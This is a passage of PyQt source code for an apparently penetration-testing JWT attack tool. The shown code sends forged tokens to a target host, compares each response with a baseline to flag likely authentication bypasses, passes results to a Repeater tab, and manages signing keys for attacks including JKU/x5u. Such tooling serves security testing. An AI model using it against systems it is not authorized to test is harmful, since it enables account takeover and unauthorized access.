            status_item = _item("Pending...", COLOR_TEXT_MUTED, Qt.AlignCenter | Qt.AlignVCenter)
        elif result.error and not result.status_code:
            status_item = _item("Error", COLOR_CRITICAL, Qt.AlignCenter | Qt.AlignVCenter)
        else:
            sc = result.status_code
            if sc == 0:
                sc_color = COLOR_TEXT_MUTED
            elif sc < 300:
                sc_color = COLOR_SUCCESS
            elif sc < 400:
                sc_color = COLOR_LOW
            elif sc < 500:
                sc_color = COLOR_WARNING
            else:
                sc_color = COLOR_CRITICAL
            status_item = _item(str(sc) if sc else "—", sc_color, Qt.AlignCenter | Qt.AlignVCenter)

        self.results_table.setItem(row, 2, status_item)
        length_str = str(len(result.response_body)) if result.response_body else "—"
        self.results_table.setItem(row, 3, _item(length_str, align=Qt.AlignCenter | Qt.AlignVCenter))
        time_str = f"{result.elapsed_ms:.0f}" if result.elapsed_ms else "—"
        self.results_table.setItem(row, 4, _item(time_str, align=Qt.AlignCenter | Qt.AlignVCenter))
        # Baseline comparison column (col 5)
        if is_baseline:
            bl_text, bl_color = ("REF", COLOR_ACCENT)
        elif pending or result.matches_baseline is None:
            bl_text, bl_color = ("?", COLOR_TEXT_MUTED)
        elif result.matches_baseline:
            bl_text, bl_color = ("+ Match", COLOR_CRITICAL)
        else:
            bl_text, bl_color = ("- Differs", COLOR_TEXT_MUTED)
        self.results_table.setItem(row, 5, _item(bl_text, bl_color, Qt.AlignCenter | Qt.AlignVCenter))
        self.results_table.setItem(row, 6, _item(result.severity, sev_color))
        token_preview = result.token[:60] + "..." if len(result.token) > 60 else result.token
        self.results_table.setItem(row, 7, _item(token_preview, COLOR_TEXT_MUTED))

        if not pending and is_baseline:
            # Distinct blue tint for the baseline reference row
            for col in range(8):
                it = self.results_table.item(row, col)
                if it:
                    it.setBackground(QBrush(QColor("#1a2a3a")))
        elif not pending and result.matches_baseline:
            # Red highlight = matches baseline = potential bypass
            for col in range(8):
                it = self.results_table.item(row, col)
                if it:
                    it.setBackground(QBrush(QColor("#3a1a1a")))
        elif not pending and not result.error and result.status_code and result.status_code < 300:
            for col in range(8):
                it = self.results_table.item(row, col)
                if it:
                    it.setBackground(QBrush(QColor("#1a3a1a")))

    def _start_baseline_then_attacks(self, results: List[AttackResult]):
        """Send the original request first to capture baseline, then dispatch attack worker."""
        raw = self.request_edit.toPlainText()
        host = self.host_edit.text().strip()
        port = self.port_spin.value()
        is_https = self.https_cb.isChecked()
        idx = self.location_combo.currentIndex()
        if idx == 1:
            # Cookie (auto-detect): use stored location or re-detect from raw request
            location = self._jwt_location if self._jwt_location.startswith("Cookie:") \
                else _detect_jwt_location(raw)
            if not location.startswith("Cookie:"):
                location = "Cookie:session"  # safe fallback
        else:
            loc_map = {0: "Authorization", 2: "Body", 3: "custom:X-Auth-Token"}
            location = loc_map.get(idx, "Authorization")

        # ── Prepend Baseline row at position 0 ────────────────────────────
        baseline_result = AttackResult(
            name="Baseline (Original Token)",
            token=self._jwt_token,
            description="Original unmodified request — used as reference for comparison.",
            severity="Info",
        )
        self._attack_results.insert(0, baseline_result)
        self.results_table.insertRow(0)
        self._set_table_row(0, baseline_result, pending=True)

        # Build tasks with row indices shifted by 1 (baseline occupies index 0)
        tasks = []
        for row in range(1, len(self._attack_results)):
            r = self._attack_results[row]
            if r.token and not r.error:
                tasks.append((row, raw, host, port, is_https, r.token, location))

        if not tasks:
            self._set_status("[i]  No tokens to send (all attacks skipped or need config).", COLOR_TEXT_MUTED)
            return

        self._pending_tasks = tasks
        self._baseline_status = 0
        self._baseline_length = 0
        self.progress_bar.setMaximum(len(tasks))
        self.progress_bar.setValue(0)
        self.progress_bar.setVisible(True)
        self.run_all_btn.setEnabled(False)
        self.run_sel_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self._set_status(f"[>>]  Sending baseline request to {host}:{port}...", COLOR_LOW)

        self._baseline_worker = BaselineWorker(
            raw, host, port, is_https, self._jwt_token, location, parent=self
        )
        self._baseline_worker.baseline_done.connect(self._on_baseline_ready)
        self._baseline_worker.start()

    @pyqtSlot(int, str, dict, float, str)
    def _on_baseline_ready(self, status: int, body: str, headers: dict, elapsed: float, sent_req: str):
        """Baseline captured — populate row 0, then start the attack worker."""
        self._baseline_status = status
        self._baseline_length = len(body)
        # Fill in the baseline result row (always at index 0)
        if self._attack_results and self._attack_results[0].name == "Baseline (Original Token)":
            r0 = self._attack_results[0]
            r0.status_code = status
            r0.response_body = body
            r0.response_headers = headers
            r0.elapsed_ms = elapsed
            r0.sent_request = sent_req
            r0.success = (200 <= status < 300) if status else False
            r0.matches_baseline = None  # IS the baseline — no comparison applies
            self._set_table_row(0, r0, pending=False)
        host = self.host_edit.text().strip()
        port = self.port_spin.value()
        bl_info = f"HTTP {status}, {self._baseline_length}B" if status else "no response"
        self._set_status(
            f"[...]  Baseline: {bl_info} — running {len(self._pending_tasks)} attacks against {host}:{port}...",
            COLOR_LOW,
        )
        self._worker = RequestWorker(
            self._pending_tasks,
            delay_ms=self.delay_spin.value(),
            timeout_s=self.timeout_spin.value(),
            extra_headers=self._get_ngrok_headers(),
            parent=self,
        )
        self._worker.result_ready.connect(self._on_result_ready)
        self._worker.all_done.connect(self._on_all_done)
        self._worker.start()

    def _start_send_worker(self, results: List[AttackResult]):
        """Direct attack start without baseline (kept for API compatibility)."""
        raw = self.request_edit.toPlainText()
        host = self.host_edit.text().strip()
        port = self.port_spin.value()
        is_https = self.https_cb.isChecked()
        idx = self.location_combo.currentIndex()
        if idx == 1:
            location = self._jwt_location if self._jwt_location.startswith("Cookie:") \
                else _detect_jwt_location(raw)
            if not location.startswith("Cookie:"):
                location = "Cookie:session"
        else:
            loc_map = {0: "Authorization", 2: "Body", 3: "custom:X-Auth-Token"}
            location = loc_map.get(idx, "Authorization")

        tasks = []
        for row, r in enumerate(results):
            if r.token and not r.error:
                tasks.append((row, raw, host, port, is_https, r.token, location))

        if not tasks:
            self._set_status("[i]  No tokens to send (all attacks skipped or need config).", COLOR_TEXT_MUTED)
            return

        self.progress_bar.setMaximum(len(tasks))
        self.progress_bar.setValue(0)
        self.progress_bar.setVisible(True)
        self.run_all_btn.setEnabled(False)
        self.run_sel_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self._set_status(f"[...]  Running {len(tasks)} attacks against {host}:{port}...", COLOR_LOW)

        self._worker = RequestWorker(
            tasks,
            delay_ms=self.delay_spin.value(),
            timeout_s=self.timeout_spin.value(),
            extra_headers=self._get_ngrok_headers(),
            parent=self,
        )
        self._worker.result_ready.connect(self._on_result_ready)
        self._worker.all_done.connect(self._on_all_done)
        self._worker.start()

    @pyqtSlot(int, int, str, dict, float, str, str)
    def _on_result_ready(self, row: int, status: int, body: str, headers: dict, elapsed: float, error: str, sent_req: str):
        if row < len(self._attack_results):
            r = self._attack_results[row]
            r.status_code = status
            r.response_body = body
            r.response_headers = headers
            r.elapsed_ms = elapsed
            r.error = error
            r.sent_request = sent_req
            r.success = (status > 0 and status < 300)
            # Compare against baseline
            if self._baseline_status and status:
                same_status = (status == self._baseline_status)
                resp_len = len(body)
                bl_len = self._baseline_length
                length_match = bl_len > 0 and abs(resp_len - bl_len) <= max(50, int(bl_len * 0.05))
                r.matches_baseline = same_status and length_match
            else:
                r.matches_baseline = None
            # Canary check
            canary_val = self.canary_edit.text().strip() if hasattr(self, 'canary_edit') else ""
            if canary_val and canary_val in body:
                r.canary_hit = True
            self._set_table_row(row, r, pending=False)
        self.progress_bar.setValue(self.progress_bar.value() + 1)

    @pyqtSlot()
    def _on_all_done(self):
        self.run_all_btn.setEnabled(True)
        self.run_sel_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_bar.setVisible(False)

        # ── Re-sort: keep baseline pinned at row 0, sort the rest ─────────
        def _sort_key(r: AttackResult):
            # Lower value = higher priority
            if r.matches_baseline:  return 0
            if r.canary_hit:        return 1
            if r.success:           return 2
            return 3
        if self._attack_results and self._attack_results[0].name == "Baseline (Original Token)":
            baseline_row = [self._attack_results[0]]
            rest = self._attack_results[1:]
            rest.sort(key=_sort_key)
            self._attack_results = baseline_row + rest
        else:
            self._attack_results.sort(key=_sort_key)
        self.results_table.setRowCount(0)
        self.results_table.setRowCount(len(self._attack_results))
        for i, r in enumerate(self._attack_results):
            self._set_table_row(i, r, pending=False)

        success_count = sum(1 for r in self._attack_results if r.success)
        baseline_matches = sum(1 for r in self._attack_results if r.matches_baseline)
        if self._baseline_status and baseline_matches:
            self._set_status(
                f"[!!]  Done — {len(self._attack_results)} attacks | "
                f"{baseline_matches} MATCH BASELINE (same status+length = potential bypasses!) | "
                f"{success_count} got 2xx.",
                COLOR_CRITICAL,
            )
        else:
            bl_note = f" | Baseline: HTTP {self._baseline_status}, {self._baseline_length}B" if self._baseline_status else ""
            self._set_status(
                f"[+]  Done — {len(self._attack_results)} attacks, {success_count} got 2xx{bl_note}.",
                COLOR_SUCCESS if success_count else COLOR_TEXT_MUTED,
            )

    def _stop_attacks(self):
        if self._baseline_worker and self._baseline_worker.isRunning():
            self._baseline_worker.terminate()
        if self._worker:
            self._worker.stop()
        self.stop_btn.setEnabled(False)
        self._set_status("[X]  Stopped.", COLOR_TEXT_MUTED)

    def _on_result_selected(self):
        rows = self.results_table.selectionModel().selectedRows()
        if not rows:
            return
        row = rows[0].row()
        if row >= len(self._attack_results):
            return
        r = self._attack_results[row]
        self.detail_request_edit.setPlainText(r.sent_request or "—")
        resp_lines = []
        if r.status_code:
            resp_lines.append(f"HTTP/1.1 {r.status_code}")
            for k, v in r.response_headers.items():
                resp_lines.append(f"{k}: {v}")
            resp_lines.append("")
        if r.response_body:
            resp_lines.append(r.response_body)
        elif r.error:
            resp_lines.append(f"[Error] {r.error}")
        else:
            resp_lines.append("—")
        self.detail_response_edit.setPlainText("\n".join(resp_lines))

        # ── JWT View panel: decoded forged token ──────────────────────────
        tok = r.token
        if tok and tok not in ("__NO_TOKEN__", ""):
            self.jwt_view_token.setText(tok)
            parts = _split_jwt(tok)
            if parts and len(parts) >= 2:
                h_dec = _decode_part(parts[0])
                p_dec = _decode_part(parts[1])
                self.jwt_view_header.setPlainText(
                    json.dumps(h_dec, indent=2) if h_dec else "(decode error)"
                )
                self.jwt_view_payload.setPlainText(
                    json.dumps(p_dec, indent=2) if p_dec else "(decode error)"
                )
            else:
                self.jwt_view_header.setPlainText("(invalid JWT)")
                self.jwt_view_payload.setPlainText("(invalid JWT)")
        else:
            self.jwt_view_token.clear()
            label = "No token sent" if tok == "__NO_TOKEN__" else "—"
            self.jwt_view_header.setPlainText(label)
            self.jwt_view_payload.setPlainText(label)

        # ── Notes / Exploit Context panel ─────────────────────────────────
        self.jwt_view_notes.setPlainText(r.description or "")

    def _result_context_menu(self, pos):
        row_items = self.results_table.selectionModel().selectedRows()
        if not row_items:
            return
        row = row_items[0].row()
        if row >= len(self._attack_results):
            return
        r = self._attack_results[row]

        menu = QMenu(self)
        copy_token_act = menu.addAction("[C] Copy Forged Token")
        copy_response_act = menu.addAction("[C] Copy Response Body")
        menu.addSeparator()
        send_repeat_act = menu.addAction("[>>] Send to Repeater")
        menu.addSeparator()
        decode_act = menu.addAction("[?] Decode This Token")

        action = menu.exec_(self.results_table.viewport().mapToGlobal(pos))
        if action == copy_token_act:
            QApplication.clipboard().setText(r.token)
        elif action == copy_response_act:
            QApplication.clipboard().setText(r.response_body)
        elif action == send_repeat_act:
            self._send_result_to_repeater(r)
        elif action == decode_act and r.token:
            parts = _split_jwt(r.token)
            if parts:
                self._decode_and_display_jwt(r.token)
                self.token_display.blockSignals(True)
                self.token_display.setText(r.token)
                self.token_display.blockSignals(False)

    def _send_result_to_repeater(self, result: AttackResult):
        """Build a modified raw request with the forged token and send to Repeater."""
        if not result.token:
            return
        parent_gui = self.window() or self._parent_gui
        repeater_tab = getattr(parent_gui, "repeater_tab", None) if parent_gui else None

        # Fallback: locate Repeater by visible tab name when direct attribute is unavailable.
        if repeater_tab is None and parent_gui and hasattr(parent_gui, "tab_widget"):
            for i in range(parent_gui.tab_widget.count()):
                if "Repeater" in parent_gui.tab_widget.tabText(i):
                    candidate = parent_gui.tab_widget.widget(i)
                    if hasattr(candidate, "add_request") or hasattr(candidate, "load_request"):
                        repeater_tab = candidate
                        break

        if repeater_tab is None:
            QMessageBox.warning(self, "Repeater", "Repeater tab not found.")
            return

        raw = self.request_edit.toPlainText()
        host = self.host_edit.text().strip()
        port = self.port_spin.value()
        is_https = self.https_cb.isChecked()
        # Inject token into raw request
        new_raw = re.sub(
            r'(?im)(Authorization:\s*Bearer\s+)([\w\-\.]+)',
            lambda m: m.group(1) + result.token,
            raw,
        )
        if new_raw == raw:
            old_m = re.search(r'(eyJ[\w\-]+\.eyJ[\w\-]+\.[\w\-]*)', raw)
            if old_m:
                new_raw = raw.replace(old_m.group(1), result.token)

        if hasattr(repeater_tab, "add_request"):
            repeater_tab.add_request(new_raw, host=host, port=port, use_ssl=is_https, tab_name="JWT Attack")
        elif hasattr(repeater_tab, "load_request"):
            # Backward compatibility with older Repeater implementations.
            repeater_tab.load_request(new_raw, host=host, port=port, use_ssl=is_https)
        else:
            QMessageBox.warning(self, "Repeater", "Repeater tab is not compatible.")
            return

        tab_widget = getattr(parent_gui, "tab_widget", None) if parent_gui else None
        if tab_widget:
            for i in range(tab_widget.count()):
                if "Repeater" in tab_widget.tabText(i):
                    tab_widget.setCurrentIndex(i)
                    break

    def _send_current_to_repeater(self):
        rows = self.results_table.selectionModel().selectedRows()
        if not rows:
            return
        row = rows[0].row()
        if row >= len(self._attack_results):
            return
        self._send_result_to_repeater(self._attack_results[row])

    def _open_token_editor(self):
        if not self._jwt_header and not self._jwt_payload:
            QMessageBox.information(self, "JWT Editor",
                                    "Parse a JWT first, then use the editor.")
            return
        dlg = TokenEditDialog(self._jwt_header, self._jwt_payload, parent=self)
        dlg.token_forged.connect(self._on_token_forged)
        dlg.exec_()

    @pyqtSlot(str)
    def _on_token_forged(self, token: str):
        self.token_display.blockSignals(True)
        self.token_display.setText(token)
        self.token_display.blockSignals(False)
        self._jwt_token = token
        self._decode_and_display_jwt(token)
        self._set_status("[E]  Custom forged token loaded. Run attacks or send to Repeater.", COLOR_ACCENT)

    def _clear_results(self):
        self._attack_results.clear()
        self.results_table.setRowCount(0)
        self.detail_request_edit.clear()
        self.detail_response_edit.clear()
        self._set_status("Results cleared.", COLOR_TEXT_MUTED)

    def _export_results(self):
        if not self._attack_results:
            QMessageBox.information(self, "Export", "No results to export.")
            return
        path, _ = QFileDialog.getSaveFileName(
            self, "Export JWT Results", os.path.expanduser("~/jwt_results.json"),
            "JSON (*.json);;CSV (*.csv);;All files (*)"
        )
        if not path:
            return
        try:
            if path.endswith(".csv"):
                lines = ["#,Attack,Status,Length,Time(ms),Severity,Token"]
                for i, r in enumerate(self._attack_results):
                    lines.append(
                        f"{i+1},{r.name!r},{r.status_code},{len(r.response_body)},"
                        f"{r.elapsed_ms:.0f},{r.severity},{r.token[:60]!r}"
                    )
                text = "\n".join(lines)
                with open(path, "w", encoding="utf-8") as f:
                    f.write(text)
            else:
                data = [
                    {
                        "name": r.name,
                        "token": r.token,
                        "description": r.description,
                        "severity": r.severity,
                        "status_code": r.status_code,
                        "response_body": r.response_body[:2000],
                        "response_headers": r.response_headers,
                        "elapsed_ms": r.elapsed_ms,
                        "success": r.success,
                        "error": r.error,
                    }
                    for r in self._attack_results
                ]
                with open(path, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2)
            self._set_status(f"[S]  Results exported to {path}", COLOR_SUCCESS)
        except Exception as e:
            QMessageBox.critical(self, "Export Error", str(e))

    # ─────────────────────────────────────────────────────────────────────────────
    # Key Manager slots
    # ─────────────────────────────────────────────────────────────────────────────

    def _km_key_preview_and_save(self, key_data: dict) -> bool:
        """Show a preview/edit dialog for a freshly generated key before saving it.
        Returns True if the user saved, False if discarded."""
        dlg = QDialog(self)
        dlg.setWindowTitle("Generated Key — Preview & Edit")
        dlg.setModal(True)
        dlg.setMinimumWidth(620)
        dlg.setMinimumHeight(500)
        _lay = QVBoxLayout(dlg)
        _lay.setSpacing(6)
        _lay.setContentsMargins(10, 10, 10, 10)

        # ── Quick-edit header row ─────────────────────────────────────────
        head_row = QHBoxLayout()
        head_row.setSpacing(8)
        head_row.addWidget(QLabel("Key ID (kid):"))
        kid_edit = QLineEdit(key_data.get("kid", ""))
        kid_edit.setStyleSheet(self._input_style())
        kid_edit.setMinimumWidth(220)
        head_row.addWidget(kid_edit, 1)
        head_row.addSpacing(12)
        _type_txt = f"<b>{key_data.get('_type', '?')}</b>  {key_data.get('alg', key_data.get('kty', ''))}  {key_data.get('_size', '')}"
        type_lbl = QLabel(_type_txt)
        type_lbl.setStyleSheet(f"color:{COLOR_TEXT_BRIGHT};")
        head_row.addWidget(type_lbl)
        _lay.addLayout(head_row)

        # ── Tab view ──────────────────────────────────────────────────────
        tabs = QTabWidget()
        tabs.setDocumentMode(True)
        tabs.setStyleSheet(self._subtabs_style())

        # Private JWK — editable
        priv_jwk_edit = QPlainTextEdit()
        priv_jwk_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        priv_jwk_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:#E06C75;"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        _priv = key_data.get("_priv_jwk")
        if _priv:
            priv_jwk_edit.setPlainText(json.dumps(_priv, indent=2))
        else:
            priv_jwk_edit.setPlainText("(No private key available)")
            priv_jwk_edit.setReadOnly(True)
        JSONHighlighter(priv_jwk_edit.document())
        tabs.addTab(priv_jwk_edit, "JWK (Private)  ✏")

        # Public JWK — read-only
        pub_jwk_view = QPlainTextEdit()
        pub_jwk_view.setReadOnly(True)
        pub_jwk_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        pub_jwk_view.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:#61AFEF;"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        _pub = key_data.get("_pub_jwk")
        if _pub:
            pub_jwk_view.setPlainText(json.dumps(_pub, indent=2))
        JSONHighlighter(pub_jwk_view.document())
        tabs.addTab(pub_jwk_view, "JWK (Public)")

        # PEM private — read-only
        pem_priv_view = QPlainTextEdit()
        pem_priv_view.setReadOnly(True)
        pem_priv_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        pem_priv_view.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_WARNING};"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        pem_priv_view.setPlainText(key_data.get("_pem_priv", ""))
        tabs.addTab(pem_priv_view, "PEM (Private)")

        # PEM public — read-only
        pem_pub_view = QPlainTextEdit()
        pem_pub_view.setReadOnly(True)
        pem_pub_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        pem_pub_view.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:#98C379;"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        pem_pub_view.setPlainText(key_data.get("_pem_pub", ""))
        tabs.addTab(pem_pub_view, "PEM (Public)")

        _lay.addWidget(tabs, 1)

        hint = QLabel("Tip: edits to the JWK (Private) tab are applied when you click Save Key.")
        hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        _lay.addWidget(hint)

        # ── Buttons ───────────────────────────────────────────────────────
        btn_row = QHBoxLayout()
        btn_row.addStretch()
        save_btn = QPushButton("✔  Save Key")
        save_btn.setStyleSheet(self._btn_style(COLOR_ACCENT))
        save_btn.clicked.connect(dlg.accept)
        discard_btn = QPushButton("✖  Discard")
        discard_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        discard_btn.clicked.connect(dlg.reject)
        btn_row.addWidget(save_btn)
        btn_row.addWidget(discard_btn)
        _lay.addLayout(btn_row)

        if dlg.exec_() != QDialog.Accepted:
            return False

        # Apply kid edit
        new_kid = kid_edit.text().strip()
        if new_kid:
            key_data["kid"] = new_kid
            if key_data.get("_pub_jwk"):
                key_data["_pub_jwk"]["kid"] = new_kid
            if key_data.get("_priv_jwk"):
                key_data["_priv_jwk"]["kid"] = new_kid

        # Apply private JWK edits (if user changed the JSON)
        priv_text = priv_jwk_edit.toPlainText().strip()
        if priv_text and priv_text not in ("(No private key available)",):
            try:
                edited_priv = json.loads(priv_text)
                key_data["_priv_jwk"] = edited_priv
                if "kid" in edited_priv:
                    key_data["kid"] = edited_priv["kid"]
                if "alg" in edited_priv:
                    key_data["alg"] = edited_priv["alg"]
                # Sync the top-level 'k' for symmetric keys so signing code
                # always reads the value the user last edited, not the stale
                # value from original generation.
                if key_data.get("_type") == "Symmetric" and "k" in edited_priv:
                    key_data["k"] = edited_priv["k"]
            except (json.JSONDecodeError, ValueError):
                pass  # keep original if parse fails

        self._km_add_key(key_data)
        return True

    def _km_add_key(self, key_data: dict):
        """Append *key_data* to the session store and add a row to km_table."""
        self._managed_keys.append(key_data)
        row = self.km_table.rowCount()
        self.km_table.insertRow(row)
        type_colors = {"RSA": "#4A90D9", "EC": "#7B5EA7", "OKP": "#2E8B57", "Symmetric": COLOR_ACCENT}
        type_item = QTableWidgetItem(key_data.get("_type", "?"))
        type_item.setForeground(QBrush(QColor(type_colors.get(key_data.get("_type", ""), COLOR_TEXT))))
        self.km_table.setItem(row, 0, type_item)
        self.km_table.setItem(row, 1, QTableWidgetItem(key_data.get("alg", key_data.get("kty", "?"))))
        self.km_table.setItem(row, 2, QTableWidgetItem(key_data.get("kid", "")))
        self.km_table.setItem(row, 3, QTableWidgetItem(key_data.get("_size", "")))
        self.km_table.selectRow(row)
        self._refresh_jku_key_combo()

    def _refresh_jku_key_combo(self):
        """Rebuild the JKU/x5u RSA key combo in Attack Config from _managed_keys."""
        if not hasattr(self, 'jku_km_key_combo'):
            return
        current_data = self.jku_km_key_combo.currentData()
        self.jku_km_key_combo.blockSignals(True)
        self.jku_km_key_combo.clear()
        self.jku_km_key_combo.addItem("(auto — Key Manager selection / server key)", None)
        for idx, k in enumerate(self._managed_keys):
            if k.get('_type') == 'RSA' and k.get('_priv_jwk'):
                kid  = k.get('kid', f'key-{idx}')
                alg  = k.get('alg', 'RSA')
                size = k.get('_size', '')
                self.jku_km_key_combo.addItem(f"{kid}  [{alg}  {size}]".strip(), idx)
        # Restore previous selection if still valid
        for i in range(self.jku_km_key_combo.count()):
            if self.jku_km_key_combo.itemData(i) == current_data:
                self.jku_km_key_combo.setCurrentIndex(i)
                break
        self.jku_km_key_combo.blockSignals(False)

    def _km_generate_symmetric(self):
        """Generate or import a symmetric (oct) key for HS256/HS384/HS512."""
        import os, uuid as _uuid
        dlg = QDialog(self)
        dlg.setWindowTitle("New Symmetric Key")
        dlg.setModal(True)
        dlg.setMinimumWidth(460)
        dlg.setMinimumHeight(320)
        _lay = QVBoxLayout(dlg)
        _lay.setSpacing(6)

        inner_tabs = QTabWidget()
        inner_tabs.setDocumentMode(True)
        inner_tabs.setStyleSheet(self._subtabs_style())

        # ── Tab 1: Generate random ────────────────────────────────────────
        gen_w = QWidget()
        gen_lay = QVBoxLayout(gen_w)
        gen_lay.setContentsMargins(8, 8, 8, 8)
        gen_form = QFormLayout()
        gen_form.setSpacing(6)
        alg_cb = QComboBox()
        alg_cb.addItems(["HS256", "HS384", "HS512"])
        alg_cb.setStyleSheet(self._input_style())
        gen_form.addRow("Algorithm:", alg_cb)
        kid_edit = QLineEdit(str(_uuid.uuid4()))
        kid_edit.setStyleSheet(self._input_style())
        gen_form.addRow("Key ID (kid):", kid_edit)
        gen_lay.addLayout(gen_form)
        gen_lay.addStretch()
        inner_tabs.addTab(gen_w, "Generate New")

        # ── Tab 2: Paste existing secret ──────────────────────────────────
        paste_w = QWidget()
        paste_lay = QVBoxLayout(paste_w)
        paste_lay.setContentsMargins(8, 8, 8, 8)
        paste_lay.setSpacing(6)
        paste_form = QFormLayout()
        paste_form.setSpacing(6)
        paste_alg_cb = QComboBox()
        paste_alg_cb.addItems(["HS256", "HS384", "HS512"])
        paste_alg_cb.setStyleSheet(self._input_style())
        paste_form.addRow("Algorithm:", paste_alg_cb)
        paste_kid_edit = QLineEdit(str(_uuid.uuid4()))
        paste_kid_edit.setStyleSheet(self._input_style())
        paste_form.addRow("Key ID (kid):", paste_kid_edit)
        paste_lay.addLayout(paste_form)
        paste_hint = QLabel(
            "Paste your secret below as a hex string, Base64URL, raw text, or a JWK {\"kty\":\"oct\",…}."
        )
        paste_hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        paste_hint.setWordWrap(True)
        paste_lay.addWidget(paste_hint)
        paste_secret_edit = QPlainTextEdit()
        paste_secret_edit.setPlaceholderText(
            "e.g.  your-256-bit-secret\n"
            "or    4d617269...(hex)\n"
            "or    {\"kty\":\"oct\",\"k\":\"c2VjcmV0\",\"alg\":\"HS256\"}"
        )
        paste_secret_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        paste_secret_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT};"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        paste_secret_edit.setMinimumHeight(100)
        paste_lay.addWidget(paste_secret_edit)
        inner_tabs.addTab(paste_w, "Paste Existing Secret")

        _lay.addWidget(inner_tabs, 1)

        btns = QHBoxLayout()
        ok_btn = QPushButton("OK")
        ok_btn.setStyleSheet(self._btn_style(COLOR_ACCENT))
        ok_btn.clicked.connect(dlg.accept)
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        cancel_btn.clicked.connect(dlg.reject)
        btns.addWidget(ok_btn)
        btns.addWidget(cancel_btn)
        _lay.addLayout(btns)

        if dlg.exec_() != QDialog.Accepted:
            return

        # ── Paste path ────────────────────────────────────────────────────
        if inner_tabs.currentIndex() == 1:
            raw_text = paste_secret_edit.toPlainText().strip()
            if not raw_text:
                QMessageBox.warning(self, "Empty Input", "No secret material was pasted.")
                return
            alg  = paste_alg_cb.currentText()
            kid  = paste_kid_edit.text().strip() or str(_uuid.uuid4())
            try:
                raw: bytes
                # JWK path
                if raw_text.lstrip().startswith("{"):
                    data = json.loads(raw_text)
                    if data.get("kty") != "oct" or "k" not in data:
                        raise ValueError("JWK must have kty=oct and a 'k' field.")
                    raw = _b64url_decode(data["k"])
                    kid = data.get("kid", kid)
                    alg = data.get("alg", alg)
                # Hex path (all hex chars, even length)
                elif all(c in "0123456789abcdefABCDEF" for c in raw_text) and len(raw_text) % 2 == 0:
                    raw = bytes.fromhex(raw_text)
                else:
                    # Try base64url / base64, fall back to UTF-8 raw
                    try:
                        raw = _b64url_decode(raw_text)
                    except Exception:
                        raw = raw_text.encode("utf-8")
                nbytes = len(raw)
                k_b64 = _b64url_encode(raw)
                key_data = {
                    "_type": "Symmetric", "_size": f"{nbytes * 8}-bit",
                    "kty": "oct", "alg": alg, "use": "sig", "kid": kid,
                    "k": k_b64,
                    "_pub_jwk":  {"kty": "oct", "alg": alg, "use": "sig", "kid": kid, "k": k_b64},
                    "_priv_jwk": {"kty": "oct", "alg": alg, "use": "sig", "kid": kid, "k": k_b64},
                    "_pem_pub":  "(Symmetric keys have no PEM representation)",
                    "_pem_priv": f"# Raw secret hex:\n{raw.hex()}\n\n# Base64URL (JWK 'k'):\n{k_b64}",
                }
                if self._km_key_preview_and_save(key_data):
                    self._set_status(
                        f"Imported {alg} symmetric key ({nbytes*8}-bit)  kid={key_data['kid']}", COLOR_SUCCESS
                    )
            except Exception as exc:
                QMessageBox.warning(self, "Import Failed", str(exc))
            return

        # ── Generate path ─────────────────────────────────────────────────
        alg = alg_cb.currentText()
        nbytes = {"HS256": 32, "HS384": 48, "HS512": 64}[alg]
        raw = os.urandom(nbytes)
        kid = kid_edit.text().strip() or str(_uuid.uuid4())
        k_b64 = _b64url_encode(raw)
        key_data = {
            "_type": "Symmetric", "_size": f"{nbytes * 8}-bit",
            "kty": "oct", "alg": alg, "use": "sig", "kid": kid,
            "k": k_b64,
            "_pub_jwk":  {"kty": "oct", "alg": alg, "use": "sig", "kid": kid, "k": k_b64},
            "_priv_jwk": {"kty": "oct", "alg": alg, "use": "sig", "kid": kid, "k": k_b64},
            "_pem_pub":  "(Symmetric keys have no PEM representation)",
            "_pem_priv": f"# Raw secret hex:\n{raw.hex()}\n\n# Base64URL (JWK 'k'):\n{k_b64}",
        }
        if self._km_key_preview_and_save(key_data):
            self._set_status(f"Generated {alg} symmetric key  kid={key_data['kid']}", COLOR_SUCCESS)

    def _km_generate_rsa(self):
        """Generate a new RSA key pair OR import an existing PEM/JWK into the Key Manager."""
        import uuid as _uuid
        dlg = QDialog(self)
        dlg.setWindowTitle("New RSA Key")
        dlg.setModal(True)
        dlg.setMinimumWidth(480)
        dlg.setMinimumHeight(340)
        _lay = QVBoxLayout(dlg)
        _lay.setSpacing(6)

        inner_tabs = QTabWidget()
        inner_tabs.setDocumentMode(True)
        inner_tabs.setStyleSheet(self._subtabs_style())

        # ── Tab 1: Generate ───────────────────────────────────────────────
        gen_w = QWidget()
        gen_lay = QVBoxLayout(gen_w)
        gen_lay.setContentsMargins(8, 8, 8, 8)
        gen_lay.setSpacing(6)
        gen_form = QFormLayout()
        gen_form.setSpacing(6)
        size_cb = QComboBox()
        size_cb.addItems(["2048", "4096"])
        size_cb.setStyleSheet(self._input_style())
        gen_form.addRow("Key Size (bits):", size_cb)
        alg_cb = QComboBox()
        alg_cb.addItems(["RS256", "RS384", "RS512", "PS256", "PS384", "PS512"])
        alg_cb.setStyleSheet(self._input_style())
